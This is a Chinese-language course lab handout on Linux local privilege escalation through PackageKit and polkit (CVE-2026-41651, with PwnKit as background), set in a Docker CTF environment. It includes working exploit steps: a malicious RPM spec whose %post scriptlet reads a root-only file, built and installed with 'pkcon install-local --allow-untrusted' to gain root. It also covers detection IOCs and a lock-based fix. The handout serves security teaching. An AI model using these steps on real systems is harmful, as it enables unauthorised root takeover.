# Week 12 — Linux 本地提權架構實驗室

**日期**：2026/05/11–05/17  
**時長**：3 小時（180 分鐘）  
**主題**：PackageKit、polkit 與 TOCTOU Race Condition  
**核心 CVE**：[CVE-2026-41651](https://nvd.nist.gov/vuln/detail/CVE-2026-41651)（Pack2TheRoot，CVSS 8.8）

\[TOC\]

---

## 一、課程目標

完成本實驗後，學生應能：

1. 解釋 Linux privilege separation 架構（DBus → PackageKit → polkit）
2. 理解 TOCTOU race condition 的原理與成因
3. 分析 CVE-2026-41651 的三個連鎖缺陷
4. 使用 Kali Linux 工具觀察 system authorization flow
5. 實際觸發本地提權並取得 root 存取
6. 提出具體的 defensive mitigation 方法

---

## 二、課程時間配置

| 時間 | 模組 | 類型 |
|------|------|------|
| 0:00–0:20 | Lecture：架構與威脅模型 | 講授 |
| 0:20–0:50 | Interactive Lab 1：System Recon → Flag 1 🟢 | 互動引導 + 手動操作 |
| 0:50–1:40 | Interactive Lab 2：TOCTOU 攻擊 → Flag 2 🟡 | 互動引導 + 手動操作 |
| 1:40–1:50 | Break | 休息 |
| 1:50–2:30 | Interactive Lab 3：防禦實作 → Flag 3 🔴 | 互動引導 + 編程實作 |
| 2:30–3:00 | Report Writing | 個人作業 |

---

## 三、環境準備（課前完成，**不佔課堂時間**）

### 3.1 安裝 Docker

```bash
sudo apt-get update
sudo apt-get install -y docker.io docker-compose-plugin
sudo systemctl start docker
sudo usermod -aG docker $USER
newgrp docker
```

### 3.2 啟動 Pack2TheRoot Lab

```bash
git clone https://github.com/dinosn/pack2theroot-lab.git
cd pack2theroot-lab
docker compose build && docker compose up -d
```

### 3.3 驗證環境

```bash
# 確認三個 container 都在跑
docker compose ps

# 進入 vulnerable container
ssh labuser@localhost -p 2222
# 密碼：labuser
```

看到 shell prompt 代表環境就緒，輸入 `exit` 離開。

---

### 3.4 奪旗流程：互動式 Lab Shell（**強制要求**）

本課程的 **三個 CTF Flag 必須透過互動式 Lab Shell 取得**。光是對 container 下指令無法獲得旗幟——互動驗證本身就是奪旗機制。

```bash
# 進入本週目錄
cd /path/to/2026-ADV-CEH/weeks/week-12

# 啟動互動式奪旗平台
python3 w12-interactive-lab.py
```

不需要 `sshpass` — 腳本會自動使用 `pexpect` 處理 SSH 認證。

**運作原理**：

```
你執行指令 → 輸入答案 → 系統驗證 → 正確 → 🏁 Flag 釋出
                                → 錯誤 → 漸進提示 → 再試
```

**功能特色**：
| 功能 | 說明 |
|------|------|
| 🏁 **旗幟即獎勵** | 每道關卡通過後，系統動態產出唯一 Flag |
| 🔒 **階段鎖定** | 未完成 Phase 1 無法進入 Phase 2，確保循序漸進 |
| ✅ **輸入驗證** | 比對你的答案與預期結果，即時回饋正確/錯誤 |
| 💡 **漸進提示** | 答錯 3 次出現 hint，5 次自動顯示答案（不卡關） |
| 💾 **進度持久化** | 隨時 Ctrl+C 中斷，下次執行自動從中斷處繼續 |
| 🔧 **環境檢查** | 內建自動檢測 Docker、container、SSH 是否就緒 |

---

### 3.5 直接操作 Container（自由探索）

如需直接 SSH 進入 container 進行自由操作（與互動式 Lab 互補）：

```bash
# 有漏洞的 container（Lab 主要目標）
ssh labuser@localhost -p 2222
# 密碼：labuser

# 已修補的 container（對比測試用）
ssh labuser@localhost -p 2223
# 密碼：labuser
```

在 container 內可直接執行 `pkaction`、`pkcon`、`rpmbuild` 等指令，適合手動驗證漏洞或測試自訂 payload。

#### 手動測試步驟（SSH 進入後）

**① 檢查 polkit 授權規則**

```bash
pkaction --verbose --action-id org.freedesktop.packagekit.package-install-untrusted
# 預期：allow_active = yes（過度寬鬆，正常應為 auth_admin）

cat /etc/polkit-1/rules.d/10-pack2theroot-lab-misconfig.rules
# 預期：polkit.addRule(function(action, subject) { return polkit.Result.YES; })
```

**② 建立惡意 RPM 觸發 TOCTOU 漏洞**

```bash
# 建立 RPM 規格檔
cat > /tmp/evil.spec << 'EOF'
Name: lab-evil-pkg
Version: 1.0
Release: 1
Summary: CTF
License: MIT
BuildArch: noarch
%description
CVE-2026-41651
%prep
echo x > README
%build
%install
mkdir -p %{buildroot}
%post
cat /root/flag.txt > /tmp/flag_captured.txt
chmod 644 /tmp/flag_captured.txt
id >> /tmp/flag_captured.txt
%files
%doc README
EOF

# 打包
mkdir -p ~/rpmbuild/{BUILD,RPMS,SOURCES,SPECS,SRPMS}
rpmbuild -bb /tmp/evil.spec

# 透過 PackageKit 安裝（繞過 polkit 授權）
pkcon install-local --allow-untrusted ~/rpmbuild/RPMS/noarch/lab-evil-pkg-*.rpm

# 確認 root 執行
cat /tmp/flag_captured.txt
# 預期輸出：PACK2THEROOT{...} + uid=0(root)
```

**③ 檢查 IOC（攻擊痕跡）**

```bash
journalctl -u packagekit | grep "assertion failed"
# 預期輸出：assertion failed: (!transaction->priv->emitted_finished)
```

---

## 四、Lecture — 架構與威脅模型（20 分鐘）

### 4.1 Linux 特權服務架構

普通使用者需要安裝套件時，不是直接呼叫 root，而是透過一層授權架構：

```
使用者（非 root）
       ↓
    DBus（system bus）
       ↓
  PackageKit daemon（pkd）
       ↓
    polkit（授權決策）
       ↓
  特權操作（安裝 / 移除套件）
```

這個設計的目的是**最小權限原則**：GUI 應用程式可在不持有 root 的情況下請求特權操作，由 polkit 集中決定是否允許。

### 4.2 兩個時代的 TOCTOU

同一套授權架構，四年內出現兩個性質相近的重大漏洞：

| CVE | 名稱 | 年份 | 漏洞位置 | CVSS |
|-----|------|------|---------|------|
| [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034) | PwnKit | 2022 | `pkexec.c`（polkit 執行器）| 7.8 |
| [CVE-2026-41651](https://nvd.nist.gov/vuln/detail/CVE-2026-41651) | Pack2TheRoot | 2026 | `pk-transaction.c`（PackageKit）| 8.8 |

---

#### CVE-2021-4034 — PwnKit（歷史背景）

**發現者**：Qualys Research Team  
**揭露日期**：2022 年 1 月 25 日  
**受影響系統**：所有裝有 polkit 的 Linux 發行版（Ubuntu、Debian、Fedora、RHEL、CentOS…）  
**影響範圍**：2009 年以來所有版本的 polkit，橫跨 12 年以上

**漏洞位置**：`pkexec.c`，polkit 的命令列執行器

**技術機制**：

`pkexec` 在初始化時會解析 `argv`，但對 `argc == 0` 的邊界條件處理有誤：
1. 若 `argc` 為 0，程式會從 `argv[1]` 讀取資料，但此位址實際上是 `envp[0]`（環境變數陣列）
2. 攻擊者可透過精心構造的環境變數，讓 `pkexec` 在 `execve()` 後的 `argv` 重建過程中寫入可控位址
3. 最終造成 out-of-bounds write，覆蓋環境變數為 `GCONV_PATH=.`，誘使 `pkexec` 載入攻擊者的惡意 library

**攻擊條件**：本地登入帳號（任何權限層級皆可），不需網路存取

**修補方式**：在 `pkexec.c` 加入 `argc == 0` 的邊界檢查，並使用 `secure_getenv()` 取代 `getenv()`

**歷史意義**：PwnKit 證明了安全架構的信任假設本身可能是漏洞所在——polkit 設計用來保護特權操作，但其執行器本身卻存在可被利用的記憶體錯誤。

---

#### CVE-2026-41651 — Pack2TheRoot（本週主角）

**發現者**：Deutsche Telekom Red Team  
**揭露日期**：2026 年 4 月 22 日  
**受影響系統**：Ubuntu 18.04–26.04、Debian Trixie 13.4、Rocky Linux 10.1、Fedora 43  
**受影響版本**：PackageKit 1.0.2–1.3.4（同樣跨越 12 年以上）  
**修補版本**：PackageKit 1.3.5

**漏洞位置**：`pk-transaction.c`，PackageKit 的交易管理核心

**與 PwnKit 的關鍵差異**：

PwnKit 是記憶體層的漏洞（out-of-bounds write）；Pack2TheRoot 是邏輯層的漏洞（TOCTOU + 狀態機缺陷）。前者需要記憶體利用技巧，後者只需要標準的套件管理工具。

**IOC**：系統日誌出現 `assertion failed: (!transaction->priv->emitted_finished)`

### 4.3 TOCTOU 原理

**Time-of-Check-Time-of-Use**：檢查（Check）與使用（Use）之間存在時間窗口，在窗口期間狀態被改變。

```
[授權檢查] 通過 ✓
     ↕  ← 這個窗口是漏洞所在
[執行操作] 使用已過期的授權結果
```

### 4.4 CVE-2026-41651 技術核心

Pack2TheRoot 的根本原因是 `pk-transaction.c` 中三個連鎖缺陷：

| # | 缺陷 | 說明 |
|---|------|------|
| 1 | State guard 缺失 | `InstallFiles()` 未驗證 transaction 當前狀態 |
| 2 | 狀態回退被靜默接受 | Backward state transition 不報錯 |
| 3 | Flag 讀取時機錯誤 | Cached transaction flags 在 dispatch 時才讀，非 authorization 時 |

**攻擊流程**：

攻擊者對同一個 transaction 發送兩個非同步 D-Bus 呼叫：
1. 第一個帶 `SIMULATE` flag → 通過 polkit 授權（只模擬，不實際安裝）
2. 第二個立即發送含惡意套件的請求

GLib event loop 的優先順序保證兩個訊息在 callback 執行前都被處理，polkit 授權被繞過，惡意套件的 post-install script 以 root 執行。

**影響範圍**：Ubuntu 18.04–26.04、Debian Trixie 13.4、Rocky Linux 10.1、Fedora 43。

**修補版本**：PackageKit 1.3.5（2026-04-22）。

---

## 五、Interactive Lab 1 — 系統偵察與奪旗 🟢（0:20–0:50）

### 學習重點
- 透過互動式 Lab Shell 進行第一階段挑戰
- 理解 polkit action 與授權規則結構
- 找出 container 中的設定錯誤

### 操作方式

```bash
# 啟動互動式 Lab Shell
python3 w12-interactive-lab.py

# 選擇 Phase 1
# → 回答問題，通過驗證後自動獲得 Flag 1
```

### 你將在互動過程中學到

1. **Q1**：檢查 PackageKit 版本是否在受影響範圍
2. **Q2**：閱讀自訂 polkit 規則檔，找出回傳 `YES` 的 action
3. **Q3**：解釋為何 `allow_active = yes` 是危險設定

### 驗收標準

- Flag 1 由互動式 Lab Shell 動態產出
- 截圖終端機畫面（含 🏁 Flag 1 CAPTURED! 字樣）

---

## 六、Interactive Lab 2 — TOCTOU 攻擊與奪旗 🟡（0:50–1:40）

### 操作方式

```bash
# 啟動互動式 Lab Shell（進度會自動延續）
python3 w12-interactive-lab.py

# 選擇 Phase 2
# → 互動系統會引導你完成攻擊並驗證結果
```

### 你將在互動過程中學到

1. **Q1**：Fedora 使用 RPM 還是 DEB 格式？
2. **Q2**：哪個 pkcon 參數允許安裝未簽章套件？
3. **建立惡意 RPM**：互動系統自動在 container 中建立含 `%post` scriptlet 的套件
4. **安裝觸發**：系統執行 `pkcon install-local --allow-untrusted`
5. **驗證**：系統回讀 `/tmp/flag_captured.txt` 確認 root 執行
6. **Q3**：為什麼 `%post` scriptlet 能以 root 執行？

### 真實攻擊流程（互動系統背後幫你完成）

```bash
# 以下是由互動系統自動執行的指令（供理解用）：
ssh labuser@localhost -p 2222

# 建立 RPM 規格檔
cat > /tmp/evil.spec << 'SPECEOF'
Name: lab-evil-pkg
Version: 1.0
...
%post
cat /root/flag.txt > /tmp/flag_captured.txt
id >> /tmp/flag_captured.txt
SPECEOF

# 打包並安裝
rpmbuild -bb /tmp/evil.spec
pkcon install-local --allow-untrusted ~/rpmbuild/RPMS/noarch/lab-evil-pkg-*.rpm

# 讀取旗幟
cat /tmp/flag_captured.txt
```

### 驗收標準

- Flag 2 由互動式 Lab Shell 動態產出
- 截圖終端機畫面（含 🏁 Flag 2 CAPTURED! 字樣）
- 截圖 `/tmp/flag_captured.txt` 內容（含 `uid=0(root)` 輸出）

---

## 七、Interactive Lab 3 — 防禦實作與奪旗 🔴（1:50–2:30）

### 操作方式

```bash
# 啟動互動式 Lab Shell（進度會自動延續）
python3 w12-interactive-lab.py

# 選擇 Phase 3
# → 互動系統會引導你完成 safe_execute() 實作並驗證
```

### 你將在互動過程中學到

1. **觀察**：執行脆弱版本，觀察 race condition 造成的負數餘額
2. **實作**：編輯 `transaction_demo.py` 的 `safe_execute()` 方法
3. **驗證**：互動系統自動執行 1000 輪壓力測試
4. **Q4**：解釋你選擇的修復方法

### 安全實作提示

```python
# 方法 A：使用 threading.Lock()
def safe_execute(self, amount):
    with self.lock:
        if self.state != self.AUTHORIZED:
            return False
        time.sleep(0.001)  # 模擬 GLib event loop 延遲
        if self.state != self.AUTHORIZED:
            return False
        self.balance -= amount
        self.state = self.COMPLETE
        self.execution_count += 1
        return True
```

### 驗收標準

- Flag 3 由互動式 Lab Shell 動態產出
- 截圖終端機畫面（含 🏁 Flag 3 CAPTURED! 字樣）
- 壓力測試結果須顯示「balance 出現負數：0 次」且「執行超過一次：0 次」

---

## 八、IOC 與偵測

若系統遭受 Pack2TheRoot 攻擊，可在系統日誌觀察到：

```bash
journalctl -u packagekit | grep "assertion failed"
# 預期輸出：assertion failed: (!transaction->priv->emitted_finished)
```

此 assertion failure 是 PackageKit daemon 崩潰的特徵，也是攻擊成功的副作用。

---

## 九、繳交說明

請依 `pentest-report-template.md` 格式，以**繁體中文**撰寫滲透測試報告，**每人一份**。

| 項目 | 要求 |
|------|------|
| 格式 | 依 template 填寫，存成 `.docx` |
| 截圖 | Flag 1、Flag 2、Flag 3 截圖必附 |
| 檔名 | `W12_滲透測試報告_學號_姓名.docx` |
| 截止 | 上課當週週日 23:59 |

**截圖要求**：
- Flag 1：互動式 Lab Shell 顯示 🏁 Flag 1 CAPTURED! 的畫面
- Flag 2：互動式 Lab Shell 顯示 🏁 Flag 2 CAPTURED! 的畫面 + container 中 `/tmp/flag_captured.txt` 內容（須含 `uid=0(root)`）
- Flag 3：互動式 Lab Shell 顯示 🏁 Flag 3 CAPTURED! 的畫面 + 壓力測試結果（0 負數、0 重複）

---

## 十、延伸閱讀

- [Pack2TheRoot 原始技術分析 — Telekom Security](https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html)
- [CVE-2026-41651 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-41651)
- [CVE-2026-41651 — Ubuntu Security](https://ubuntu.com/security/CVE-2026-41651)
- [dinosn/pack2theroot-lab — CTF Docker Lab](https://github.com/dinosn/pack2theroot-lab)
- [PwnKit (CVE-2021-4034) — Qualys 原始技術分析](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkt.txt)
- [polkit 架構說明 — freedesktop.org](https://www.freedesktop.org/software/polkit/docs/latest/)
